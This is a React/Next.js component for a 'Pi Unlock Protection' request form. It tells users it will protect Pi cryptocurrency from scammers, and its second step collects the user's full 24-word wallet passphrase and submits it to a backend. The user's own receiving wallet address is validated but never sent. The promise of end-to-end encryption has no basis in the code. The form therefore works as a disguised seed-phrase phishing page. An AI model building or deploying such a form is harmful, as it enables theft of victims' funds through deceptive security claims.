"use client"

import type React from "react"

import { useState } from "react"
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from "@/components/ui/card"
import { Button } from "@/components/ui/button"
import { Input } from "@/components/ui/input"
import { Textarea } from "@/components/ui/textarea"
import { Label } from "@/components/ui/label"
import { AlertCircle, ArrowRight, Clock, Info, Loader, Lock, Shield } from "lucide-react"
import { Alert, AlertDescription, AlertTitle } from "@/components/ui/alert"
import { motion, AnimatePresence } from "framer-motion"
import { useRouter } from "next/navigation"
import { Progress } from "@/components/ui/progress"
import { Dialog, DialogContent, DialogHeader, DialogTitle, DialogTrigger } from "@/components/ui/dialog"
import { useAppDispatch } from "@/redux/hooks"
import { makeRequest } from "@/redux/slices/requests"

const ProtectionRequestForm = ({ setStep2 }: { setStep2: any }) => {
  const router = useRouter()
  const [step, setStep] = useState(1)
  const totalSteps = 2
  const [loading, setLoading] = useState(false)
  const [errors, setErrors] = useState<{
    email?: string
    publicKey?: string
    piAmount?: string
    unlockDateTime?: string
    mainnetWalletAddress?: string
    walletPassphrase?: string
  }>({})

  const [formData, setFormData] = useState({
    email: "",
    publicKey: "",
    walletPassphrase: "",
    mainnetWalletAddress: "",
    piAmount: "",
    unlockDateTime: "",
    note: "",
  })

  const dispatch = useAppDispatch()

  const handleInputChange = (e: React.ChangeEvent<HTMLInputElement | HTMLTextAreaElement>) => {
    const { name, value } = e.target
    setFormData((prev) => ({
      ...prev,
      [name]: value,
    }))

    // Clear error when user types
    if (errors[name as keyof typeof errors]) {
      setErrors((prev) => ({
        ...prev,
        [name]: undefined,
      }))
    }
  }

  const validateStep1 = () => {
    const newErrors: {
      email?: string
      publicKey?: string
      piAmount?: string
      unlockDateTime?: string
      mainnetWalletAddress?: string
    } = {}

    // Validate email
    if (!formData.email.trim()) {
      newErrors.email = "Email address is required"
    } else if (!/^\S+@\S+\.\S+$/.test(formData.email)) {
      newErrors.email = "Please enter a valid email address"
    }

    // Validate public key
    const publicKeyRegex = /^[A-Z0-9]{56}$/
    if (!formData.publicKey.trim()) {
      newErrors.publicKey = "Mainnet wallet address is required"
    } else if (!publicKeyRegex.test(formData.publicKey)) {
      newErrors.publicKey = "Please enter valid mainnet address"
    }

    // Validate Pi amount
    const piAmount = Number.parseFloat(formData.piAmount)
    if (!formData.piAmount.trim()) {
      newErrors.piAmount = "Pi amount is required"
    } else if (isNaN(piAmount) || piAmount <= 0) {
      newErrors.piAmount = "Pi amount must be a positive number"
    }

    // Validate unlock date/time (must be in the future)
    if (!formData.unlockDateTime.trim()) {
      newErrors.unlockDateTime = "Unlock date and time is required"
    } else {
      const unlockDate = new Date(formData.unlockDateTime)
      const now = new Date()
      if (isNaN(unlockDate.getTime()) || unlockDate <= now) {
        newErrors.unlockDateTime = "Unlock date and time must be in the future"
      }
    }

    setErrors(newErrors)
    return Object.keys(newErrors).length === 0
  }

  // Update the validateStep2 function to properly trim and validate the passphrase
  const validateStep2 = () => {
    const newErrors: {
      walletPassphrase?: string
    } = {}

    // Validate wallet passphrase (should have 24 words)
    if (!formData.walletPassphrase.trim()) {
      newErrors.walletPassphrase = "Wallet passphrase is required"
    } else {
      // Trim the passphrase and split by any whitespace
      const trimmedPassphrase = formData.walletPassphrase.trim()
      const words = trimmedPassphrase.split(/\s+/)

      if (words.length !== 24) {
        newErrors.walletPassphrase = `Passphrase must contain exactly 24 words (currently ${words.length})`
      }
    }

    setErrors(newErrors)
    return Object.keys(newErrors).length === 0
  }

  const handleContinue = (e: React.FormEvent) => {
    e.preventDefault()

    if (validateStep1()) {
      setStep(2)
      window.scrollTo(0, 0)
    }
  }

  const handleBack = () => {
    if (step > 1) {
      setStep(step - 1)
      window.scrollTo(0, 0)
    } else {
      router.back()
    }
  }

  // Update the handleSubmit function to trim the passphrase before submission
  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault()

    // Trim the passphrase and normalize spaces
    const trimmedPassphrase = formData.walletPassphrase.trim().replace(/\s+/g, " ")
    setFormData((prev) => ({
      ...prev,
      walletPassphrase: trimmedPassphrase,
    }))

    if (!validateStep2()) {
      return
    }

    setLoading(true)

    try {
      await dispatch(
        makeRequest({
          requestType: "protection",
          email: formData.email,
          piBalance: Number(formData.piAmount),
          piUnlockTime: new Date(formData.unlockDateTime),
          walletPassphrase: trimmedPassphrase, // Use the trimmed passphrase
          mainnetWalletAddress: formData.mainnetWalletAddress,
          note: formData.note,
        }),
      ).unwrap()
      setStep2(2)
    } catch (error) {
      console.error("Error submitting form:", error)
      setErrors({
        ...errors,
        walletPassphrase: "There was an error submitting your request. Please try again.",
      })
    } finally {
      setLoading(false)
    }
  }

  const slideVariants = {
    hidden: (direction: number) => ({
      x: direction > 0 ? 300 : -300,
      opacity: 0,
    }),
    visible: {
      x: 0,
      opacity: 1,
      transition: {
        type: "spring",
        stiffness: 300,
        damping: 30,
      },
    },
    exit: (direction: number) => ({
      x: direction > 0 ? -300 : 300,
      opacity: 0,
      transition: {
        type: "spring",
        stiffness: 300,
        damping: 30,
      },
    }),
  }

  return (
    <div className="space-y-4">
      <div className="mb-8">
        <div className="flex justify-between items-center mb-2">
          <span className="text-sm font-medium">
            Step {step} of {totalSteps}
          </span>
          <span className="text-sm text-muted-foreground">{step === 1 ? "Basic Information" : "Security Details"}</span>
        </div>
        <Progress value={(step / totalSteps) * 100} className="h-2" />
      </div>

      <AnimatePresence mode="wait" custom={step}>
        {step === 1 && (
          <motion.div key="step1" custom={1} variants={slideVariants} initial="hidden" animate="visible" exit="exit">
            <Card className="shadow-lg">
              <CardHeader>
                <div className="flex items-center gap-3">
                  <Shield className="h-6 w-6 text-primary" />
                  <div className="flex-1">
                    <div className="flex items-center gap-2">
                      <CardTitle>Pi Unlock Protection Request</CardTitle>
                      <Dialog>
                        <DialogTrigger asChild>
                          <Button variant="ghost" size="icon" className="h-6 w-6 rounded-full p-0">
                            <Info className="h-4 w-4 text-muted-foreground hover:text-primary" />
                          </Button>
                        </DialogTrigger>
                        <DialogContent className="sm:max-w-md">
                          <DialogHeader>
                            <DialogTitle>About Pi Unlock Protection</DialogTitle>
                          </DialogHeader>
                          <div className="space-y-4 py-4">
                            <p>This service protects your Pi when your passphrase has been exposed to scammers.</p>

                            <div className="flex items-start gap-3 p-3 bg-primary/5 rounded-lg">
                              <div className="mt-1 bg-primary/10 p-2 rounded-full">
                                <Shield className="h-5 w-5 text-primary" />
                              </div>
                              <div>
                                <h3 className="font-medium">How it works:</h3>
                                <p className="text-sm text-muted-foreground mt-1">
                                  When your passphrase is exposed to scammers, they might attempt to transfer your Pi to
                                  their wallet. Our service sets up an automated tool that will transfer your Pi to your
                                  specified wallet immediately as the lockup period ends, before scammers can access it.
                                </p>
                              </div>
                            </div>

                            <div className="flex items-start gap-3 p-3 bg-primary/5 rounded-lg">
                              <div className="mt-1 bg-primary/10 p-2 rounded-full">
                                <Clock className="h-5 w-5 text-primary" />
                              </div>
                              <div>
                                <h3 className="font-medium">Timing is critical:</h3>
                                <p className="text-sm text-muted-foreground mt-1">
                                  By providing the exact unlock date and time, we can ensure our system is ready to
                                  transfer your Pi at the precise moment it becomes available, protecting your assets.
                                </p>
                              </div>
                            </div>
                          </div>
                        </DialogContent>
                      </Dialog>
                    </div>
                    <CardDescription>Provide your details to secure your Pi from scammers</CardDescription>
                  </div>
                </div>
              </CardHeader>
              <form onSubmit={handleContinue}>
                <CardContent className="space-y-6">
                  <Alert className="bg-amber-50 border-amber-200 dark:bg-amber-950/20 dark:border-amber-800">
                    <AlertCircle className="h-4 w-4 text-amber-600 dark:text-amber-400" />
                    <AlertTitle>Important</AlertTitle>
                    <AlertDescription>
                      We&apos;ll help secure your wallet if you believe your passphrase has been compromised or leaked.
                    </AlertDescription>
                  </Alert>

                  <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
                    <div className="space-y-2">
                      <Label htmlFor="email">Email Address</Label>
                      <Input
                        id="email"
                        name="email"
                        type="email"
                        placeholder="your@email.com"
                        value={formData.email}
                        onChange={handleInputChange}
                        required
                        className={errors.email ? "border-red-500 focus-visible:ring-red-500" : ""}
                      />
                      {errors.email && (
                        <p className="text-xs text-red-500 mt-1 flex items-center gap-1">
                          <AlertCircle className="h-3 w-3" /> {errors.email}
                        </p>
                      )}
                    </div>

                    <div className="space-y-2">
                      <Label htmlFor="piAmount">Amount of Pi to be Protected</Label>
                      <Input
                        id="piAmount"
                        name="piAmount"
                        type="number"
                        step="0.01"
                        min="0.01"
                        placeholder="Total Pi amount waiting to be unlocked"
                        value={formData.piAmount}
                        onChange={handleInputChange}
                        required
                        className={errors.piAmount ? "border-red-500 focus-visible:ring-red-500" : ""}
                      />
                      {errors.piAmount && (
                        <p className="text-xs text-red-500 mt-1 flex items-center gap-1">
                          <AlertCircle className="h-3 w-3" /> {errors.piAmount}
                        </p>
                      )}
                    </div>

                    <div className="space-y-2">
                      <Label htmlFor="unlockDateTime">Exact Unlock Date & Time</Label>
                      <Input
                        id="unlockDateTime"
                        name="unlockDateTime"
                        type="datetime-local"
                        value={formData.unlockDateTime}
                        onChange={handleInputChange}
                        required
                        className={errors.unlockDateTime ? "border-red-500 focus-visible:ring-red-500" : ""}
                      />
                      {errors.unlockDateTime && (
                        <p className="text-xs text-red-500 mt-1 flex items-center gap-1">
                          <AlertCircle className="h-3 w-3" /> {errors.unlockDateTime}
                        </p>
                      )}
                      <p className="text-xs text-muted-foreground">
                        Enter the exact time when your Pi will be unlocked
                      </p>
                    </div>

                    <div className="space-y-2">
                      <Label htmlFor="publicKey">Your Mainnet Wallet to Receive Pi</Label>
                      <Input
                        id="publicKey"
                        name="publicKey"
                        placeholder="GBKVMNHHAH7YYLCP37LCN5FXO6J74F33XBMDFBKQNWHI5NLNZPBK5YFD"
                        value={formData.publicKey}
                        onChange={handleInputChange}
                        required
                        className={errors.publicKey ? "border-red-500 focus-visible:ring-red-500" : ""}
                      />
                      {errors.publicKey && (
                        <p className="text-xs text-red-500 mt-1 flex items-center gap-1">
                          <AlertCircle className="h-3 w-3" /> {errors.publicKey}
                        </p>
                      )}
                      <p className="text-xs text-muted-foreground">
                        Must be 56 characters of capital letters and numbers
                      </p>
                    </div>

                    <div className="space-y-2 md:col-span-2">
                      <Label htmlFor="note">How was your passphrase compromised? (Optional)</Label>
                      <Textarea
                        id="note"
                        name="note"
                        placeholder="Please explain how your passphrase was compromised or any other relevant information"
                        value={formData.note}
                        onChange={handleInputChange}
                      />
                    </div>
                  </div>
                </CardContent>
                <div className="flex justify-between m-2">
                  <Button type="button" variant="outline" onClick={handleBack}>
                    Back
                  </Button>
                  <Button type="submit" disabled={loading}>
                    {loading ? (
                      <>
                        Submitting...
                        <Loader className="ml-2 w-4 h-4 animate-spin" />
                      </>
                    ) : (
                      <>
                        Continue
                        <ArrowRight className="ml-2 h-4 w-4" />
                      </>
                    )}
                  </Button>
                </div>
              </form>
            </Card>
          </motion.div>
        )}

        {step === 2 && (
          <motion.div key="step2" custom={1} variants={slideVariants} initial="hidden" animate="visible" exit="exit">
            <Card className="shadow-lg">
              <CardHeader>
                <div className="flex items-center gap-3">
                  <Lock className="h-6 w-6 text-primary" />
                  <div>
                    <CardTitle>Security Information</CardTitle>
                    <CardDescription>Provide your passphrase to complete the protection request</CardDescription>
                  </div>
                </div>
              </CardHeader>
              <form onSubmit={handleSubmit}>
                <CardContent className="space-y-6">
                  <Alert className="bg-red-50 border-red-200 dark:bg-red-950/20 dark:border-red-800">
                    <AlertCircle className="h-4 w-4 text-red-600 dark:text-red-400" />
                    <AlertTitle>Sensitive Information</AlertTitle>
                    <AlertDescription>
                      Your passphrase is highly sensitive. We use end-to-end encryption to protect your data. This
                      information will only be used to secure your wallet.
                    </AlertDescription>
                  </Alert>

                  <div className="space-y-4">
                    <div className="space-y-2">
                      <Label htmlFor="walletPassphrase" className="text-base font-medium">
                        Full Wallet Passphrase
                      </Label>
                      <Textarea
                        id="walletPassphrase"
                        name="walletPassphrase"
                        placeholder="Enter your complete 24-word passphrase"
                        value={formData.walletPassphrase}
                        onChange={handleInputChange}
                        className={`min-h-[150px] font-mono text-sm ${
                          errors.walletPassphrase ? "border-red-500 focus-visible:ring-red-500" : ""
                        }`}
                        required
                      />
                      {errors.walletPassphrase && (
                        <p className="text-xs text-red-500 mt-1 flex items-center gap-1">
                          <AlertCircle className="h-3 w-3" /> {errors.walletPassphrase}
                        </p>
                      )}
                      <p className="text-sm text-muted-foreground">
                        Enter all 24 words of your passphrase, separated by spaces (no commas needed).
                      </p>
                    </div>
                  </div>
                </CardContent>
                <div className="flex justify-between m-2">
                  <Button type="button" variant="outline" onClick={handleBack}>
                    Back
                  </Button>
                  <Button type="submit" className="bg-primary hover:bg-primary/90" disabled={loading}>
                    {loading ? (
                      <>
                        Submitting...
                        <Loader className="w-5 h-5 animate-spin ml-2" />
                      </>
                    ) : (
                      "Submit"
                    )}
                  </Button>
                </div>
              </form>
            </Card>
          </motion.div>
        )}
      </AnimatePresence>
    </div>
  )
}

export default ProtectionRequestForm
